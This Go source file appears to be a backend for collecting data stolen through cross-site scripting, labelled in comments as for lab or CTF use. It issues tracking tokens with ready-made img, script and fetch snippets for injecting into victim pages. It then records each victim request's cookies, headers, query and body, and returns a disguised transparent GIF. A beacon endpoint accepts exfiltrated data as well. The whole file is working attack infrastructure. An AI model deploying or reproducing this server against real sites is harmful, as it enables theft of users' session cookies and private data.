package main

import (
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"
)

func main() {
	// allow overriding file via env for tests
	if v := os.Getenv("XSS_C2_DATAFILE"); v != "" {
		dataFile = v
	}

	if err := loadSubmissions(); err != nil {
		log.Printf("warning: could not load submissions: %v", err)
	}

	// create data directory if path contains dirs
	if dir := filepath.Dir(dataFile); dir != "." {
		os.MkdirAll(dir, 0700)
	}

	// register handlers on the default mux
	http.HandleFunc("/", dashboardHandler)
	// removed /submit endpoint
	http.HandleFunc("/submissions", submissionsAPIHandler)
	// register to create a new tracking endpoint
	http.HandleFunc("/register", registerHandler)
	// catch any incoming requests to /track/<token>
	http.HandleFunc("/track/", trackHandler)
	// beacon endpoint: accepts JSON {"data":"..."}
	http.HandleFunc("/beacon", beaconHandler)

	port := os.Getenv("PORT")
	if port == "" {
		port = "8080"
	}
	addr := ":" + port
	log.Printf("starting XSS backend on %s (datafile=%s)", addr, dataFile)
	// wrap the default mux with a simple CORS middleware so preflight and
	// Access-Control-Allow-Origin are handled globally (helps when deployed)
	handler := corsMiddleware(http.DefaultServeMux)
	if err := http.ListenAndServe(addr, handler); err != nil {
		log.Fatalf("server failed: %v", err)
	}
}

// corsMiddleware adds permissive CORS headers (lab-only) and handles OPTIONS
// preflight requests. It applies these headers to every response so redirects
// or other endpoints still include the necessary CORS headers.
func corsMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// For lab/CTF usage we default to allowing all origins. If you need
		// credentialed requests, change this to echo the Origin and set
		// Access-Control-Allow-Credentials: true (and avoid '*').
		w.Header().Set("Access-Control-Allow-Origin", "*")
		w.Header().Set("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
		w.Header().Set("Access-Control-Allow-Headers", "Content-Type")

		if r.Method == http.MethodOptions {
			// Preflight request - no body
			w.WriteHeader(http.StatusNoContent)
			return
		}

		next.ServeHTTP(w, r)
	})
}

func dashboardHandler(w http.ResponseWriter, r *http.Request) {
	mu.Lock()
	defer mu.Unlock()

	// Render the dashboard showing recent submissions. Template uses automatic
	// escaping to help avoid accidental reflected XSS in the admin UI.
	data := struct {
		Submissions []Submission
		Now         time.Time
	}{
		Submissions: submissions,
		Now:         time.Now(),
	}

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	if err := tmpl.Execute(w, data); err != nil {
		log.Printf("template execute error: %v", err)
	}
}

// beaconHandler accepts POST with JSON body {"data": "..."} and records it
func beaconHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		w.Header().Set("Allow", "POST")
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var payload struct{
		Data string `json:"data"`
	}
	dec := json.NewDecoder(r.Body)
	if err := dec.Decode(&payload); err != nil {
		http.Error(w, "invalid json", http.StatusBadRequest)
		return
	}

	if len(payload.Data) > 50000 {
		http.Error(w, "data too long", http.StatusBadRequest)
		return
	}

	s := Submission{
		Source:    "beacon",
		Data:      payload.Data,
		Note:      "beacon",
		IP:        remoteIP(r),
		CreatedAt: time.Now(),
	}

	mu.Lock()
	s.ID = nextID
	nextID++
	submissions = append([]Submission{s}, submissions...)
	if len(submissions) > 1000 {
		submissions = submissions[:1000]
	}
	mu.Unlock()

	if err := saveSubmissions(); err != nil {
		log.Printf("warning: could not save submissions: %v", err)
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]any{"status":"ok","id":s.ID})
}

// submissionsAPIHandler returns the submissions as JSON (read-only GET).
func submissionsAPIHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		w.Header().Set("Allow", "GET")
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	mu.Lock()
	defer mu.Unlock()
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(submissions)
}

// registerHandler creates a new random tracking token and returns a URL and
// a small HTML snippet you can use to trigger the tracking endpoint from a
// victim page (e.g. via <img>, <script>, fetch, or XHR).
func registerHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost && r.Method != http.MethodGet {
		w.Header().Set("Allow", "GET, POST")
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	// generate 8 random bytes -> 16 hex chars
	b := make([]byte, 8)
	if _, err := rand.Read(b); err != nil {
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}
	token := hex.EncodeToString(b)
	trackPath := "/track/" + token

	snippet := fmt.Sprintf(`<img src="%s"/>\n<!-- or -->\n<script src="%s"></script>\n<!-- or fetch: fetch('%s', {mode:'no-cors'}) -->`, trackPath, trackPath, trackPath)

	resp := map[string]any{
		"token": token,
		"url":   trackPath,
		"snippet": snippet,
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(resp)
}

// trackHandler captures any incoming request to /track/<token> and records
// the full request metadata (method, url, headers, query, cookies, body)
func trackHandler(w http.ResponseWriter, r *http.Request) {
	// extract token from path
	token := strings.TrimPrefix(r.URL.Path, "/track/")
	if token == "" {
		http.NotFound(w, r)
		return
	}

	// read a limited amount of the body
	var bodyStr string
	if r.Body != nil {
		// limit to 50KB to avoid resource abuse
		buf := make([]byte, 50000)
		n, _ := r.Body.Read(buf)
		// read remainder (if any) to drain
		rest, _ := io.ReadAll(r.Body)
		if len(rest) > 0 && n < len(buf) {
			// append rest
			buf = append(buf[:n], rest...)
			n = len(buf)
		}
		bodyStr = string(buf[:n])
	}

	// build dump
	var b strings.Builder
	fmt.Fprintf(&b, "Captured at: %s\n", time.Now().Format(time.RFC3339))
	fmt.Fprintf(&b, "Token: %s\n", token)
	fmt.Fprintf(&b, "Remote IP: %s\n", remoteIP(r))
	fmt.Fprintf(&b, "Method: %s\n", r.Method)
	fmt.Fprintf(&b, "URL: %s\n", r.URL.String())
	fmt.Fprintf(&b, "Proto: %s\n", r.Proto)
	fmt.Fprintf(&b, "Host: %s\n", r.Host)
	fmt.Fprintf(&b, "User-Agent: %s\n", r.UserAgent())
	if ref := r.Referer(); ref != "" {
		fmt.Fprintf(&b, "Referer: %s\n", ref)
	}
	fmt.Fprintf(&b, "\n-- Headers --\n")
	for k, vals := range r.Header {
		fmt.Fprintf(&b, "%s: %s\n", k, strings.Join(vals, ", "))
	}
	fmt.Fprintf(&b, "\n-- Query --\n")
	for k, vals := range r.URL.Query() {
		fmt.Fprintf(&b, "%s: %s\n", k, strings.Join(vals, ", "))
	}
	fmt.Fprintf(&b, "\n-- Cookies --\n")
	for _, c := range r.Cookies() {
		fmt.Fprintf(&b, "%s=%s; Path=%s; Domain=%s; HttpOnly=%v; Secure=%v\n", c.Name, c.Value, c.Path, c.Domain, c.HttpOnly, c.Secure)
	}
	fmt.Fprintf(&b, "\n-- Body (first 50KB) --\n%s\n", bodyStr)

	// create a submission and save
	s := Submission{
		Source:    token,
		Data:      b.String(),
		Note:      "captured",
		IP:        remoteIP(r),
		CreatedAt: time.Now(),
	}

	mu.Lock()
	s.ID = nextID
	nextID++
	submissions = append([]Submission{s}, submissions...)
	if len(submissions) > 1000 {
		submissions = submissions[:1000]
	}
	mu.Unlock()

	if err := saveSubmissions(); err != nil {
		log.Printf("warning: could not save submissions: %v", err)
	}

	// reply with a small transparent GIF so image hits look "realistic" to pages
	gif := []byte{
		0x47, 0x49, 0x46, 0x38, 0x39, 0x61,
		0x01, 0x00, 0x01, 0x00, 0x80, 0x00,
		0x00, 0x00, 0x00, 0x00, 0xff, 0xff,
		0xff, 0x21, 0xf9, 0x04, 0x01, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x2c, 0x00, 0x00,
		0x00, 0x00, 0x01, 0x00, 0x01, 0x00,
		0x00, 0x02, 0x02, 0x44, 0x01, 0x00,
		0x3b,
	}
	w.Header().Set("Content-Type", "image/gif")
	w.Header().Set("Content-Length", fmt.Sprintf("%d", len(gif)))
	w.WriteHeader(http.StatusOK)
	w.Write(gif)
}
